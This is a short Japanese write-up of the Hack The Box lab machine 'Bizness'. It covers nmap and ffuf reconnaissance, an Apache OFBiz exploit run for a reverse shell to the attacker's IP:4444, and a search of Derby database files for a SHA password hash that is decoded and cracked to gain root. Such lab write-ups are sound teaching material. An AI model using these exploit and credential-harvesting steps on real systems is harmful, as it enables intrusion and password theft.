---
title: "HTB: Bizness"
date: 2024-06-05T04:49:04+09:00
draft: false
---

## user

- nmap
  - ssh, http, ssl/http あたり
  - http アクセスでサイトが立ち上がる
- ffuf
  - /control
  - OFBiz らしい
  - こういうのはまず公式サイトから構成を簡単にさらう
- OFBiz
  - Registered User が見つかる
  - 下にバージョンが書いてある
  - HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある
  - [https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz]()
- CVE
  - CVE が刺さる
  - ```python3 ofbiz_exploit.py https://bizness.htb shell IP:4444```
- shell
  - shell に入れた
  - /home/ofbiz/user.txt

## root

- ```sudo -l```
  - 無理でした
- Derby
  - /opt/ofbiz に色々インストールされてる
  - config を見ると SHA が ~ とかいろいろ書かれている
    - ```ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties```
  - derby に関するファイルを探す
    - ```/opt/ofbiz/runtime/data/derby```
  - 列挙すると seg0 に .dat がたくさん入ってる
  - ```find . -type f -name “*.dat” -exec grep “SHA” {} \;```
  - ```c5490.dat``` がそれっぽいので見る
    - ```currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I```
  - これをクラックすればいいんだが全然できない
- ハッシュクラック
  - writeup を見るとどうやら base64 でエンコードされているらしい
  - base64 -> hashcat で解読する
  - root パスワードで su root
  - root.txt

base64 エンコードが全然できなかった．．．
公式ドキュメントを見るとそれっぽいことが書いてあったからこれは調査不足だ．．．
